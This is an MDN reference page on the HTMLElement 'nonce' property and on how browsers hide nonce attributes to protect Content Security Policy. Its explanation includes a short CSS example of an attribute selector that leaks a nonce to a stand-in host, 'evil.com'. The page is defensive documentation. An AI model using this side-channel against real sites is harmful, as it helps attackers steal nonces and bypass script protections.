---
title: "HTMLElement: nonce property"
tool: "mdn-api"
version: "2026-11"
source: "https://github.com/mdn/content/blob/c44f591049bc129b356acb0a9ce281974c035113/files/en-us/web/api/htmlelement/nonce/index.md"
commit: "c44f591049bc129b356acb0a9ce281974c035113"
license: "CC-BY-SA-2.5"
---

# HTMLElement: nonce property

The **`nonce`** property of the `HTMLElement` interface returns the cryptographic number used once that is used by Content Security Policy to determine whether a given fetch will be allowed to proceed.

In later implementations, elements only expose their `nonce` attribute to scripts (and not to side-channels like CSS attribute selectors).

## Examples

### Retrieving a nonce value

In the past, not all browsers supported the `nonce` IDL attribute, so a workaround is to try to use `getAttribute` as a fallback:

```js
let nonce = script["nonce"] || script.getAttribute("nonce");
```

However, recent browsers version hide `nonce` values that are accessed this way (an empty string will be returned). The IDL property (`script['nonce']`) will be the only way to access nonces.

Nonce hiding helps prevent attackers from exfiltrating nonce data via mechanisms that can grab data from content attributes like this CSS selector:

```css
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## See also

- `nonce` global attribute
- Content Security Policy
- CSP:
